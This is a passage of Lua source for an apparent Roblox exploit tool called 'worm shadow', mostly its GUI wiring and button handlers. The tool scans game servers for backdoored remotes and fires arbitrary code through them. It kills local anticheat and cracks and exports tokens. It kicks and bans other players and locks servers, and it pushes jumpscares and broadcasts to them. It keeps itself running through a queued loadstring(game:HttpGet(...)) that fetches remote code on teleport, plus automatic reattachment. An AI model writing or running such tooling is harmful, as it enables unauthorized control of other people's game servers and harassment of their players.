MusicPlayBtn=makeBtn(CtrlTab,"PLAY",C.Acc,80,296,274)
MusicStopBtn=makeBtn(CtrlTab,"STOP",C.Warn,80,382,274)
sectionLabel(CtrlTab,"SERVER LOCK",310)
WLInput=makeInput(CtrlTab,"extra whitelist (comma sep)",500,10,328,"")
LockSrvBtn=makeBtn(CtrlTab,"RESTRICT SERVER",C.Acc,200,10,362)
UnlockSrvBtn=makeBtn(CtrlTab,"UNLOCK",C.Mute,130,216,362)
sectionLabel(CtrlTab,"PERSISTENCE",400)
PersistBtn=makeBtn(CtrlTab,"PERSIST: OFF",C.Mute,140,10,418)
KeepAliveBtn2=makeBtn(CtrlTab,"KEEP-ALIVE: ON",C.Acc,140,156,418)
SaveStateBtn=makeBtn(CtrlTab,"SAVE STATE",C.Mute,140,302,418)
LoadStateBtn=makeBtn(CtrlTab,"LOAD STATE",C.Mute,140,448,418)
AdmTab=TabContents["ADMIN"]
sectionLabel(AdmTab,"IMMUNITY",6)
ImmBtn=makeBtn(AdmTab,"IMMUNITY: ON",C.Acc,200,10,24)
sectionLabel(AdmTab,"TARGET",60)
PlayerBox=makeInput(AdmTab,"player name...",240,10,78)
PlayerDropdownBtn=makeBtn(AdmTab,"ONLINE",C.Acc2,100,256,78)
PlayerScroll=Instance.new("ScrollingFrame")
PlayerScroll.Size=UDim2.new(0,350,0,100)
PlayerScroll.Position=UDim2.new(0,10,0,110)
PlayerScroll.BackgroundColor3=C.Panel
PlayerScroll.BorderSizePixel=0
PlayerScroll.Visible=false
PlayerScroll.CanvasSize=UDim2.new(0,0,0,0)
PlayerScroll.AutomaticCanvasSize=Enum.AutomaticSize.Y
PlayerScroll.ScrollBarThickness=4
PlayerScroll.Parent=AdmTab
Instance.new("UIListLayout",PlayerScroll).Padding=UDim.new(0,2)
sectionLabel(AdmTab,"DURATION",218)
TimeInput=makeInput(AdmTab,"10",100,10,236,"10")
UnitMinBtn=makeBtn(AdmTab,"Min",C.Acc,60,116,236)
UnitHrBtn=makeBtn(AdmTab,"Hrs",C.Panel,60,182,236)
UnitDayBtn=makeBtn(AdmTab,"Days",C.Panel,60,248,236)
sectionLabel(AdmTab,"REASON",272)
ReasonBox=makeInput(AdmTab,"optional reason...",500,10,290)
sectionLabel(AdmTab,"ACTIONS",326)
KickBtn=makeBtn(AdmTab,"TIMEOUT",C.Danger,200,10,344)
UnbanBtn=makeBtn(AdmTab,"UNBAN",C.Acc,140,216,344)
BannedListBtn=makeBtn(AdmTab,"BAN LIST",C.Pink,140,362,344)
BannedScroll=Instance.new("ScrollingFrame")
BannedScroll.Size=UDim2.new(0,500,0,100)
BannedScroll.Position=UDim2.new(0,10,0,380)
BannedScroll.BackgroundColor3=C.Panel
BannedScroll.BorderSizePixel=0
BannedScroll.Visible=false
BannedScroll.CanvasSize=UDim2.new(0,0,0,0)
BannedScroll.AutomaticCanvasSize=Enum.AutomaticSize.Y
BannedScroll.ScrollBarThickness=4
BannedScroll.Parent=AdmTab
Instance.new("UIListLayout",BannedScroll).Padding=UDim.new(0,2)
SelectedLbl=Instance.new("TextLabel")
SelectedLbl.Size=UDim2.new(0,500,0,20)
SelectedLbl.Position=UDim2.new(0,10,0,486)
SelectedLbl.BackgroundTransparency=1
SelectedLbl.Text="selected: none"
SelectedLbl.Font=Enum.Font.Code
SelectedLbl.TextSize=10
SelectedLbl.TextColor3=C.Mute
SelectedLbl.TextXAlignment=Enum.TextXAlignment.Left
SelectedLbl.Parent=AdmTab
HubTab=TabContents["HUB"]
sectionLabel(HubTab,"SCRIPT HUB",6)
HubList=Instance.new("Frame")
HubList.Size=UDim2.new(1,-20,0,500)
HubList.Position=UDim2.new(0,10,0,24)
HubList.BackgroundTransparency=1
HubList.Parent=HubTab
Instance.new("UIListLayout",HubList).Padding=UDim.new(0,4)
for _,p in ipairs(HUB_PRESETS) do local b=makeBtn(HubList,p.name,C.Acc2,260,0,0) b.Size=UDim2.new(1,0,0,28) b.MouseButton1Click:Connect(function() if not ST.Backdoor or not isBackdoorAlive() then setStatus("scan first",C.Danger) return end fireAny(ST.Backdoor,p.code:gsub("%%username%%",LP.Name)) setStatus("hub: "..p.name,C.Acc) end) end
sectionLabel(HubTab,"HD ADMIN SHORTCUTS",200)
HDRow=Instance.new("Frame")
HDRow.Size=UDim2.new(1,-20,0,800)
HDRow.Position=UDim2.new(0,10,0,218)
HDRow.BackgroundTransparency=1
HDRow.Parent=HubTab
hdLayout=Instance.new("UIGridLayout",HDRow)
hdLayout.CellSize=UDim2.new(0,150,0,26)
hdLayout.CellPadding=UDim2.new(0,6,0,4)
for _,s in ipairs(HD_SHORTCUTS) do local b=makeBtn(HDRow,s.name,C.Warn,150,0,0,26) b.MouseButton1Click:Connect(function() if runHD(s.cmd) then setStatus("hd: "..s.cmd,C.Warn) else setStatus("HD not found",C.Danger) end end) end
function runScan(mode) local pBD=ST.Backdoor local pFB=ST.FoundBy ST.Backdoor=nil ST.Tagged={} ST.FoundBy="-" ST.AllHits={} local remotes=collectRemotes() ST.TestedCount=#remotes ST.ScanCount=ST.ScanCount+1 ST.ValueBaseCache=collectValueBases() pcall(computeGameSignature) if mode=="all" and CFG.AUTO_ATTACH then pcall(autoAttachFromScripts) end log("scan #"..ST.ScanCount.." mode="..mode.." - "..#remotes.." remotes (VB: "..#ST.ValueBaseCache..")") if mode=="all" then local found=runAllMethods(remotes) if not found then ST.Backdoor=pBD ST.FoundBy=pFB end return found end if mode=="route" then if not scanProtected() then ST.Backdoor=pBD ST.FoundBy=pFB return false end return true end if mode=="probe" then scanProbe(remotes) ST.Backdoor=pBD ST.FoundBy=pFB return false end if mode=="single" then if not scanSingleTarget(remotes) then ST.Backdoor=pBD ST.FoundBy=pFB return false end return true end if mode=="part" then if not scanParallel(remotes) then ST.Backdoor=pBD ST.FoundBy=pFB return false end return true end if mode=="head" then if not scanHead(remotes) then ST.Backdoor=pBD ST.FoundBy=pFB return false end return true end if mode=="brute" then if not scanBrute(remotes) then ST.Backdoor=pBD ST.FoundBy=pFB return false end return true end return false end
function doScanClick(btn,label,mode) if ST.Locked then setStatus("locked - UNLOCK first",C.Warn) return end if ST.Scanning then return end local now=tick() if now-(ST.LastScanTime or 0)<CFG.SCAN_COOLDOWN then setStatus("cooldown "..math.ceil(CFG.SCAN_COOLDOWN-(now-ST.LastScanTime)).."s",C.Warn) return end ST.LastScanTime=now ST.Scanning=true ST.UserScanned=true ST.VerifyAttempts=0 ST.VerifyRejects=0 ST.FailureLog={} ST.BackdoorConfidence=0 lockScan(true) btn.Text="..." task.spawn(function() local ok,err=pcall(runScan,mode) if not ok then log("scan err: "..tostring(err)) end ST.Scanning=false btn.Text=label if ok and ST.Backdoor then ST.KeepAlive=true ST.Locked=true ST.Retries=0 setStatus("LOCKED - "..ST.Backdoor.Name.." ("..#ST.AllHits.." hits)",C.Acc) notify("worm shadow","VERIFIED - "..#ST.AllHits,C.Acc,5) saveState() pcall(saveIntel) lockScan(true) applyLockedVisual() else lockScan(false) setStatus("no verified backdoor",C.Danger) log("done (rejected: "..ST.VerifyRejects..")") end updateInfo() end) end
ScanAllBtn.MouseButton1Click:Connect(function() doScanClick(ScanAllBtn,"SCAN ALL","all") end)
RouteBtn.MouseButton1Click:Connect(function() doScanClick(RouteBtn,"ROUTE","route") end)
SingleBtn.MouseButton1Click:Connect(function() doScanClick(SingleBtn,"SINGLE","single") end)
PartBtn.MouseButton1Click:Connect(function() doScanClick(PartBtn,"PART","part") end)
HeadBtn.MouseButton1Click:Connect(function() doScanClick(HeadBtn,"HEAD","head") end)
BruteBtn.MouseButton1Click:Connect(function() doScanClick(BruteBtn,"BRUTE","brute") end)
ProbeBtn.MouseButton1Click:Connect(function() doScanClick(ProbeBtn,"PROBE","probe") end)
UnlockBtn.MouseButton1Click:Connect(function() if not ST.Locked then setStatus("not locked",C.Mute) return end ST.Locked=false ST.Backdoor=nil ST.FoundBy="-" ST.Retries=0 lockScan(false) applyLockedVisual() updateInfo() setStatus("unlocked",C.Warn) end)
AutoExecBtn.MouseButton1Click:Connect(function() CFG.AUTO_EXEC=not CFG.AUTO_EXEC AutoExecBtn.Text="AUTO-EXEC: "..(CFG.AUTO_EXEC and "ON" or "OFF") AutoExecBtn.TextColor3=CFG.AUTO_EXEC and C.Acc or C.Mute end)
KeepAliveBtn1.MouseButton1Click:Connect(function() CFG.AUTO_RESCAN=not CFG.AUTO_RESCAN KeepAliveBtn1.Text="KEEP-ALIVE: "..(CFG.AUTO_RESCAN and "ON" or "OFF") KeepAliveBtn1.TextColor3=CFG.AUTO_RESCAN and C.Acc or C.Mute KeepAliveBtn2.Text=KeepAliveBtn1.Text KeepAliveBtn2.TextColor3=KeepAliveBtn1.TextColor3 end)
BruteModeBtn.MouseButton1Click:Connect(function() if CFG.BRUTE_MODE=="parallel" then CFG.BRUTE_MODE="sequence" BruteModeBtn.Text="BRUTE: SEQ" BruteModeBtn.TextColor3=C.Warn else CFG.BRUTE_MODE="parallel" BruteModeBtn.Text="BRUTE: PAR" BruteModeBtn.TextColor3=C.Acc2 end end)
PlayerFilterBtn.MouseButton1Click:Connect(function() CFG.STRICT_PLAYER_FILTER=not CFG.STRICT_PLAYER_FILTER if CFG.STRICT_PLAYER_FILTER then PlayerFilterBtn.Text="PLAYER: STRICT" PlayerFilterBtn.TextColor3=C.Mute else PlayerFilterBtn.Text="PLAYER: TEST" PlayerFilterBtn.TextColor3=C.Acc end updateInfo() end)
ArgHookBtn.MouseButton1Click:Connect(function() local on=not ST.HookEnabled local ok,err=wsEnableArgHook(on) if not ok then ArgHookBtn.Text="ARG-HOOK: N/A" setStatus(err,C.Danger) return end ArgHookBtn.Text="ARG-HOOK: "..(on and "ON" or "OFF") ArgHookBtn.TextColor3=on and C.Acc or C.Mute setStatus("arg hook "..(on and "on" or "off"),C.Acc2) end)
AutoRetryBtn.MouseButton1Click:Connect(function() CFG.AUTO_RETRY=not CFG.AUTO_RETRY AutoRetryBtn.Text="RETRY: "..(CFG.AUTO_RETRY and "ON" or "OFF") AutoRetryBtn.TextColor3=CFG.AUTO_RETRY and C.Acc or C.Mute end)
TokenCrackBtn.MouseButton1Click:Connect(function() CFG.TOKEN_CRACK=not CFG.TOKEN_CRACK TokenCrackBtn.Text="CRACK: "..(CFG.TOKEN_CRACK and "ON" or "OFF") TokenCrackBtn.TextColor3=CFG.TOKEN_CRACK and C.Acc or C.Mute end)
TokenDumpBtn.MouseButton1Click:Connect(function() print("[WS TOKEN]\n"..wsDumpTokenIntel()) setStatus("dumped to F9",C.Acc2) end)
TokenExportBtn.MouseButton1Click:Connect(function() if wsExportTokenIntel() then setStatus("exported",C.Acc) else setStatus("writefile no",C.Danger) end end)
TokenImportBtn.MouseButton1Click:Connect(function() if wsImportTokenIntel() then setStatus("imported",C.Acc) updateInfo() else setStatus("readfile no",C.Danger) end end)
IntelSaveBtn.MouseButton1Click:Connect(function() saveIntel() setStatus("intel saved",C.Acc) end)
ScriptScanBtn.MouseButton1Click:Connect(function() buildScriptScannerWindow() end)
KillACBtn.MouseButton1Click:Connect(function() KillACBtn.Text="..." task.spawn(function() local n=killLocalAnticheat() task.wait(0.5) if n>0 then KillACBtn.Text="AC KILLED ("..n..")" KillACBtn.TextColor3=C.Acc setStatus("AC disabled: "..n,C.Acc) else KillACBtn.Text="NO AC FOUND" KillACBtn.TextColor3=C.Mute setStatus("no AC",C.Mute) end updateInfo() end) end)
RestoreACBtn.MouseButton1Click:Connect(function() local msg="AC Log:\n" local cnt=0 for r,_ in pairs(ST.AntiCheatKilled) do local ok,n=pcall(function() return r:GetFullName() end) if ok then msg=msg.."  "..n.."\n" cnt=cnt+1 end end if cnt==0 then msg=msg.."  (none)" end print("[WS AC]\n"..msg) setStatus("AC log dumped",C.Acc2) end)
AutoAttachBtn.MouseButton1Click:Connect(function() CFG.AUTO_ATTACH=not CFG.AUTO_ATTACH CFG.AUTO_VERIFY_ATTACHED=CFG.AUTO_ATTACH AutoAttachBtn.Text="AUTO-ATTACH: "..(CFG.AUTO_ATTACH and "ON" or "OFF") AutoAttachBtn.TextColor3=CFG.AUTO_ATTACH and C.Acc or C.Mute end)
ExecBtn.MouseButton1Click:Connect(function() local code=CodeBox.Text if code=="" then setStatus("empty",C.Warn) return end if not ST.Backdoor or not isBackdoorAlive() then setStatus("backdoor dead",C.Danger) ST.Backdoor=nil return end fireAny(ST.Backdoor,code:gsub("%%username%%",LP.Name)) setStatus("exec on "..ST.Backdoor.Name,C.Acc) end)
ExecClear.MouseButton1Click:Connect(function() CodeBox.Text="" end)
MultiExec.MouseButton1Click:Connect(function() local code=CodeBox.Text if code=="" then setStatus("empty",C.Warn) return end if not ST.Backdoor or not isBackdoorAlive() then return end fireAny(ST.Backdoor,code) for _,r in ipairs(ST.Tagged) do fireAny(r,code) end setStatus("multi: "..(1+#ST.Tagged),C.Acc) end)
SaveBtn.MouseButton1Click:Connect(function() if writefile then pcall(function() writefile("ws_payload.lua",CodeBox.Text) end) setStatus("saved",C.Acc) else setStatus("writefile no",C.Danger) end end)
LoadBtn.MouseButton1Click:Connect(function() if readfile then local ok,data=pcall(function() return readfile("ws_payload.lua") end) if ok and data then CodeBox.Text=data setStatus("loaded",C.Acc) else setStatus("read failed",C.Danger) end else setStatus("readfile no",C.Danger) end end)
function fireIfFound(payload) if not ST.Backdoor or not isBackdoorAlive() then setStatus("scan first",C.Danger) ST.Backdoor=nil return false end fireAny(ST.Backdoor,payload) return true end
BcSendBtn.MouseButton1Click:Connect(function() local t=BcInput.Text if t=="" then return end if fireIfFound(broadcastPayload(t)) then setStatus("broadcast",C.Pink) end end)
ScareTargetBtn.MouseButton1Click:Connect(function() local v=ScareTargetInput.Text if v=="" then ST.ScareTarget="all" ScareTargetBtn.Text="TARGET: ALL" ScareTargetBtn.TextColor3=C.Acc2 else ST.ScareTarget=v ScareTargetBtn.Text="TARGET: "..v:sub(1,8) ScareTargetBtn.TextColor3=C.Warn end end)
ScareRepeatBtn.MouseButton1Click:Connect(function() ST.ScareRepeat=not ST.ScareRepeat ScareRepeatBtn.Text="REPEAT: "..(ST.ScareRepeat and "ON" or "OFF") ScareRepeatBtn.TextColor3=ST.ScareRepeat and C.Acc or C.Mute end)
JumpBtn.MouseButton1Click:Connect(function() local t=ST.ScareTarget if fireIfFound(jumpscarePayload(t,ST.ScareRepeat)) then setStatus("jumpscare -> "..t,C.Danger) end end)
HintBtn.MouseButton1Click:Connect(function() local t=HintInput.Text if fireIfFound(hintPayload(t)) then setStatus("hint",C.Acc2) end end)
SkyBtn.MouseButton1Click:Connect(function() local id=SkyInput.Text:gsub("%D","") if id=="" then id="130087664524149" end if fireIfFound(skyPayload(id)) then setStatus("sky: "..id,C.Acc2) end end)
MusicPlayBtn.MouseButton1Click:Connect(function() local id=MusicInput.Text:gsub("%D","") if id=="" then id="90289127130880" end if fireIfFound(musicPayload(id)) then setStatus("music: "..id,C.Acc) end end)
MusicStopBtn.MouseButton1Click:Connect(function() if fireIfFound(stopMusicPayload()) then setStatus("music stop",C.Warn) end end)
LockSrvBtn.MouseButton1Click:Connect(function() local raw=WLInput.Text local list={} if raw~="" then for name in raw:gmatch("[^,]+") do name=name:gsub("^%s+",""):gsub("%s+$","") if name~="" then table.insert(list,name) end end end ST.Whitelist=list if fireIfFound(lockPayload(LP.Name,LP.UserId,list)) then setStatus("server locked - "..#list.." wl",C.Acc) end end)
UnlockSrvBtn.MouseButton1Click:Connect(function() if fireIfFound([[
for _,o in ipairs(workspace:GetChildren()) do
if o.Name=="WS_BASE" or o.Name=="WS_SPAWN" then o:Destroy() end
end
local c=game:GetService("SoundService"):FindFirstChild("WS_CTRL")
if c then c:SetAttribute("Off",true) end
]]) then setStatus("server unlock",C.Mute) end end)
PersistBtn.MouseButton1Click:Connect(function() CFG.PERSIST=not CFG.PERSIST if CFG.PERSIST then local q=(syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport) if q then local url=CFG.PERSIST_URLS[1] q(string.format("loadstring(game:HttpGet('%s'))()",url)) PersistBtn.Text="PERSIST: ON" PersistBtn.TextColor3=C.Acc setStatus("persist armed",C.Acc) else CFG.PERSIST=false setStatus("queue unsupported",C.Danger) end else PersistBtn.Text="PERSIST: OFF" PersistBtn.TextColor3=C.Mute end end)
KeepAliveBtn2.MouseButton1Click:Connect(function() CFG.AUTO_RESCAN=not CFG.AUTO_RESCAN KeepAliveBtn2.Text="KEEP-ALIVE: "..(CFG.AUTO_RESCAN and "ON" or "OFF") KeepAliveBtn2.TextColor3=CFG.AUTO_RESCAN and C.Acc or C.Mute KeepAliveBtn1.Text=KeepAliveBtn2.Text KeepAliveBtn1.TextColor3=KeepAliveBtn2.TextColor3 end)
SaveStateBtn.MouseButton1Click:Connect(function() saveState() setStatus("state saved",C.Acc) end)
LoadStateBtn.MouseButton1Click:Connect(function() if loadState() then setStatus("restored: "..ST.Backdoor.Name,C.Acc) updateInfo() else setStatus("no valid state",C.Danger) end end)
ImmBtn.MouseButton1Click:Connect(function() ST.Immunity=not ST.Immunity if ST.Immunity then ImmBtn.Text="IMMUNITY: ON" ImmBtn.TextColor3=C.Acc else ImmBtn.Text="IMMUNITY: OFF" ImmBtn.TextColor3=C.Danger end end)
PlayerDropdownBtn.MouseButton1Click:Connect(function() PlayerScroll.Visible=not PlayerScroll.Visible if PlayerScroll.Visible then for _,c in ipairs(PlayerScroll:GetChildren()) do if c:IsA("TextButton") then c:Destroy() end end for _,p in ipairs(S.Players:GetPlayers()) do local b=Instance.new("TextButton") b.Size=UDim2.new(1,0,0,22) b.BackgroundColor3=C.Panel b.Text=p.Name.." ("..p.UserId..")" b.Font=Enum.Font.Code b.TextSize=11 b.TextColor3=C.Text b.BorderSizePixel=0 b.Parent=PlayerScroll b.MouseButton1Click:Connect(function() PlayerBox.Text=p.Name PlayerScroll.Visible=false end) end end end)
function setUnit(u,btn) ST.TimeUnit=u for _,b in ipairs({UnitMinBtn,UnitHrBtn,UnitDayBtn}) do b.BackgroundColor3=C.Panel b.TextColor3=C.Mute end btn.BackgroundColor3=C.Acc btn.TextColor3=Color3.new(1,1,1) end
UnitMinBtn.MouseButton1Click:Connect(function() setUnit("Min",UnitMinBtn) end)
UnitHrBtn.MouseButton1Click:Connect(function() setUnit("Hr",UnitHrBtn) end)
UnitDayBtn.MouseButton1Click:Connect(function() setUnit("Day",UnitDayBtn) end)
KickBtn.MouseButton1Click:Connect(function() local target=PlayerBox.Text if target=="" then setStatus("no target",C.Warn) return end if ST.Immunity and target==LP.Name then setStatus("immunity",C.Warn) return end local n=tonumber(TimeInput.Text) or 10 local mult=60 if ST.TimeUnit=="Hr" then mult=3600 elseif ST.TimeUnit=="Day" then mult=86400 end local expiry=os.time()+(n*mult) ST.BanList[target]=expiry local reason=ReasonBox.Text local msg="timed out by worm shadow\n" if reason~="" then msg=msg..reason.."\n" end msg=msg..string.format("[%d %s]",n,ST.TimeUnit) if ST.Backdoor and isBackdoorAlive() then local safeMsg=msg:gsub('"','\\"'):gsub("\n","\\n"):gsub("%%","%%%%") local safeTarget=target:gsub('"','\\"') local payload=string.format([[
if not _G.WS_BANS then _G.WS_BANS={} end
_G.WS_BANS["%s"]=%d
local p=game.Players:FindFirstChild("%s")
if p then p:Kick("%s") end
if not _G.WS_WATCH then
_G.WS_WATCH=true
game.Players.PlayerAdded:Connect(function(pl)
if _G.WS_BANS and _G.WS_BANS[pl.Name] then
if os.time()<_G.WS_BANS[pl.Name] then pl:Kick("%s") else _G.WS_BANS[pl.Name]=nil end
end
end)
end
]],safeTarget,expiry,safeTarget,safeMsg,safeMsg) fireAny(ST.Backdoor,payload) end setStatus("timeout: "..target,C.Danger) PlayerBox.Text="" ReasonBox.Text="" end)
UnbanBtn.MouseButton1Click:Connect(function() local t=ST.SelectedBan if not t then setStatus("select from list",C.Warn) return end ST.BanList[t]=nil ST.SelectedBan=nil SelectedLbl.Text="selected: none" if ST.Backdoor and isBackdoorAlive() then fireAny(ST.Backdoor,string.format('if _G.WS_BANS then _G.WS_BANS["%s"]=nil end',t:gsub('"','\\"'))) end setStatus("unbanned: "..t,C.Acc) end)
BannedListBtn.MouseButton1Click:Connect(function() BannedScroll.Visible=not BannedScroll.Visible if BannedScroll.Visible then for _,c in ipairs(BannedScroll:GetChildren()) do if c:IsA("TextButton") then c:Destroy() end end for name,expiry in pairs(ST.BanList) do local b=Instance.new("TextButton") b.Size=UDim2.new(1,0,0,22) b.BackgroundColor3=C.Panel local left=math.max(0,expiry-os.time()) b.Text=string.format("%s (%ds)",name,left) b.Font=Enum.Font.Code b.TextSize=11 b.TextColor3=C.Pink b.BorderSizePixel=0 b.Parent=BannedScroll b.MouseButton1Click:Connect(function() ST.SelectedBan=name SelectedLbl.Text="selected: "..name end) end end end)
function buildScriptScannerWindow() if ST.ScriptPanelOpen then return end ST.ScriptPanelOpen=true local wf=Instance.new("Frame",GUI) wf.Name="WSScriptScanner" wf.Size=UDim2.new(0,720,0,500) wf.Position=UDim2.new(0.5,-360,0.5,-250) wf.BackgroundColor3=C.Bg wf.BorderSizePixel=0 wf.Active=true wf.ZIndex=50 Instance.new("UICorner",wf).CornerRadius=UDim.new(0,10) Instance.new("UIStroke",wf).Color=C.Bd local tb=Instance.new("Frame",wf) tb.Size=UDim2.new(1,0,0,34) tb.BackgroundColor3=C.Panel tb.BorderSizePixel=0 tb.ZIndex=51 Instance.new("UICorner",tb).CornerRadius=UDim.new(0,10) local ttl=Instance.new("TextLabel",tb) ttl.Size=UDim2.new(1,-80,1,0) ttl.Position=UDim2.new(0,14,0,0) ttl.BackgroundTransparency=1 ttl.Text="worm shadow | Script Scanner" ttl.Font=Enum.Font.GothamBold ttl.TextSize=13 ttl.TextColor3=C.Text ttl.TextXAlignment=Enum.TextXAlignment.Left ttl.ZIndex=51 local cb=Instance.new("TextButton",tb) cb.Size=UDim2.new(0,24,0,24) cb.Position=UDim2.new(1,-30,0,5) cb.BackgroundColor3=C.Danger cb.Text="X" cb.Font=Enum.Font.GothamBold cb.TextSize=16 cb.TextColor3=Color3.new(1,1,1) cb.BorderSizePixel=0 cb.ZIndex=52 Instance.new("UICorner",cb).CornerRadius=UDim.new(0,6) cb.MouseButton1Click:Connect(function() wf:Destroy() ST.ScriptPanelOpen=false end) local rb=Instance.new("Frame",wf) rb.Size=UDim2.new(1,-20,0,30) rb.Position=UDim2.new(0,10,0,44) rb.BackgroundTransparency=1 rb.ZIndex=51 local rl=Instance.new("UIListLayout",rb) rl.FillDirection=Enum.FillDirection.Horizontal rl.Padding=UDim.new(0,6) local sb=Instance.new("TextButton",rb) sb.Size=UDim2.new(0,150,1,0) sb.BackgroundColor3=C.Acc sb.Text="SCAN SCRIPTS" sb.Font=Enum.Font.GothamBold sb.TextSize=12 sb.TextColor3=Color3.new(1,1,1) sb.BorderSizePixel=0 sb.ZIndex=52 Instance.new("UICorner",sb).CornerRadius=UDim.new(0,6) local fb=Instance.new("TextButton",rb) fb.Size=UDim2.new(0,170,1,0) fb.BackgroundColor3=C.Danger fb.Text="FILTER: SUSPICIOUS" fb.Font=Enum.Font.GothamBold fb.TextSize=12 fb.TextColor3=Color3.new(1,1,1) fb.BorderSizePixel=0 fb.ZIndex=52 Instance.new("UICorner",fb).CornerRadius=UDim.new(0,6) local sl=Instance.new("TextLabel",wf) sl.Size=UDim2.new(1,-20,0,20) sl.Position=UDim2.new(0,10,0,80) sl.BackgroundTransparency=1 sl.Text="idle - press SCAN SCRIPTS" sl.Font=Enum.Font.Code sl.TextSize=11 sl.TextColor3=C.Mute sl.TextXAlignment=Enum.TextXAlignment.Left sl.ZIndex=51 local sc=Instance.new("ScrollingFrame",wf) sc.Size=UDim2.new(1,-20,1,-140) sc.Position=UDim2.new(0,10,0,104) sc.BackgroundTransparency=1 sc.BorderSizePixel=0 sc.ScrollBarThickness=4 sc.ScrollBarImageColor3=C.Acc sc.CanvasSize=UDim2.new(0,0,0,0) sc.AutomaticCanvasSize=Enum.AutomaticSize.Y sc.ZIndex=51 Instance.new("UIListLayout",sc).Padding=UDim.new(0,3) local sp=Instance.new("Frame",wf) sp.Size=UDim2.new(1,-20,0,160) sp.Position=UDim2.new(0,10,1,-170) sp.BackgroundColor3=C.Panel sp.BorderSizePixel=0 sp.Visible=false sp.ZIndex=55 Instance.new("UICorner",sp).CornerRadius=UDim.new(0,6) Instance.new("UIStroke",sp).Color=C.Bd local sttl=Instance.new("TextLabel",sp) sttl.Size=UDim2.new(1,-30,0,20) sttl.Position=UDim2.new(0,8,0,4) sttl.BackgroundTransparency=1 sttl.Text="source" sttl.Font=Enum.Font.Code sttl.TextSize=10 sttl.TextColor3=C.Acc2 sttl.TextXAlignment=Enum.TextXAlignment.Left sttl.ZIndex=56 local scl=Instance.new("TextButton",sp) scl.Size=UDim2.new(0,20,0,20) scl.Position=UDim2.new(1,-26,0,4) scl.BackgroundColor3=C.Danger scl.Text="X" scl.Font=Enum.Font.GothamBold scl.TextSize=12 scl.TextColor3=Color3.new(1,1,1) scl.BorderSizePixel=0 scl.ZIndex=56 Instance.new("UICorner",scl).CornerRadius=UDim.new(0,4) scl.MouseButton1Click:Connect(function() sp.Visible=false end) local sB=Instance.new("TextBox",sp) sB.Size=UDim2.new(1,-16,1,-32) sB.Position=UDim2.new(0,8,0,26) sB.BackgroundColor3=C.Bg sB.Text="" sB.Font=Enum.Font.Code sB.TextSize=11 sB.TextColor3=C.Text sB.TextXAlignment=Enum.TextXAlignment.Left sB.TextYAlignment=Enum.TextYAlignment.Top sB.MultiLine=true sB.TextWrapped=false sB.ClearTextOnFocus=false sB.BorderSizePixel=0 sB.ZIndex=56 Instance.new("UICorner",sB).CornerRadius=UDim.new(0,6) local fsus=true local function rnd() for _,c in ipairs(sc:GetChildren()) do if c:IsA("TextButton") or c:IsA("Frame") then c:Destroy() end end for _,f in ipairs(ST.ScriptFindings) do local ms=0 for _,h in ipairs(f.hits) do if h.sev>ms then ms=h.sev end end if not (fsus and ms<3) then local r=Instance.new("Frame",sc) r.Size=UDim2.new(1,-4,0,46) r.BackgroundColor3=C.Panel r.BorderSizePixel=0 r.ZIndex=52 Instance.new("UICorner",r).CornerRadius=UDim.new(0,6) local sd=Instance.new("Frame",r) sd.Size=UDim2.new(0,10,0,10) sd.Position=UDim2.new(0,10,0,16) sd.BackgroundColor3=(ms>=5) and Color3.fromRGB(231,76,60) or (ms>=3) and Color3.fromRGB(255,170,0) or Color3.fromRGB(46,204,113) sd.BorderSizePixel=0 sd.ZIndex=53 Instance.new("UICorner",sd).CornerRadius=UDim.new(1,0) local pl=Instance.new("TextLabel",r) pl.Size=UDim2.new(1,-30,0,16) pl.Position=UDim2.new(0,26,0,2) pl.BackgroundTransparency=1 pl.Text=f.path pl.Font=Enum.Font.Code pl.TextSize=11 pl.TextColor3=C.Text pl.TextXAlignment=Enum.TextXAlignment.Left pl.ZIndex=53 local kl=Instance.new("TextLabel",r) kl.Size=UDim2.new(1,-30,0,14) kl.Position=UDim2.new(0,26,0,18) kl.BackgroundTransparency=1 local ns={} for _,h in ipairs(f.hits) do table.insert(ns,h.name) end kl.Text="["..f.class.."] HITS: "..table.concat(ns,", ") kl.Font=Enum.Font.Code kl.TextSize=10 kl.TextColor3=Color3.fromRGB(231,76,60) kl.TextXAlignment=Enum.TextXAlignment.Left kl.ZIndex=53 local nl=Instance.new("TextLabel",r) nl.Size=UDim2.new(1,-30,0,12) nl.Position=UDim2.new(0,26,0,32) nl.BackgroundTransparency=1 nl.Text=f.hits[1] and f.hits[1].snippet or "" nl.Font=Enum.Font.Code nl.TextSize=9 nl.TextColor3=C.Mute nl.TextXAlignment=Enum.TextXAlignment.Left nl.TextTruncate=Enum.TextTruncate.AtEnd nl.ZIndex=53 local cb2=Instance.new("TextButton",r) cb2.Size=UDim2.new(1,0,1,0) cb2.BackgroundTransparency=1 cb2.Text="" cb2.ZIndex=54 cb2.MouseButton1Click:Connect(function() local src=ST.ScriptCache[f.script] and ST.ScriptCache[f.script].source if src then sp.Visible=true sttl.Text=f.path.." ("..#src.." chars)" sB.Text=src:sub(1,8000) end end) end end end sb.MouseButton1Click:Connect(function() if ST.ScriptScanActive then return end sl.Text="scanning..." task.spawn(function() runFullScriptScan() sl.Text=string.format("done: %d scanned | %d decompiled | %d findings | %d tokens",ST.ScriptsScanned,ST.ScriptsDecompiled,#ST.ScriptFindings,ST.ScriptTokensHarvested) rnd() updateInfo() end) end) fb.MouseButton1Click:Connect(function() fsus=not fsus fb.Text=fsus and "FILTER: ALL" or "FILTER: SUSPICIOUS" rnd() end) dragify(wf) return wf end
task.spawn(function() while GUI.Parent do task.wait(CFG.RESCAN_INTERVAL) if not CFG.AUTO_RESCAN then continue end if not ST.UserScanned then continue end if ST.Scanning then continue end if not ST.KeepAlive then continue end if isBackdoorAlive() then setStatus("keep-alive "..ST.Backdoor.Name,C.Acc) else setStatus("backdoor lost - rescan",C.Warn) ST.Backdoor=nil ST.Locked=false lockScan(false) applyLockedVisual() ST.Scanning=true local ok=pcall(runScan,"all") ST.Scanning=false if ok and ST.Backdoor then ST.KeepAlive=true ST.Locked=true ST.Retries=0 lockScan(true) applyLockedVisual() setStatus("REATTACHED - "..ST.Backdoor.Name,C.Acc) saveState() else ST.Retries=(ST.Retries or 0)+1 if ST.Retries>=3 then ST.KeepAlive=false ST.Retries=0 end lockScan(false) applyLockedVisual() end updateInfo() end end end)
